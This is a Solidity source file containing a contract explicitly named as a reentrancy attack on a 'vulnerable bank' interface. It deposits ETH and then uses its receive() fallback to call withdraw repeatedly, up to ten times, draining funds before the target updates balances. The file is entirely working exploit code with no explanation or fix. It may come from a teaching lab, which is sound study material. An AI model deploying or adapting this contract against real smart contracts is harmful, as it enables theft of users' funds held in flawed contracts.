// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function balances(address) external view returns (uint256);
}

contract ReentrancyAttackContract {
    IVulnerableBank public bank;
    uint256 public callCount = 0;

    constructor(address bankAddress) {
        bank = IVulnerableBank(bankAddress);
    }

    function attack() external payable {
        require(msg.value > 0, "Send ETH");
        callCount = 0;
        bank.deposit{value: msg.value}();
        bank.withdraw(msg.value);
    }

    receive() external payable {
        callCount++;
        if (callCount < 10) {
            uint256 balance = bank.balances(address(this));
            if (balance > 0) {
                try bank.withdraw(msg.value) {} catch {}
            }
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
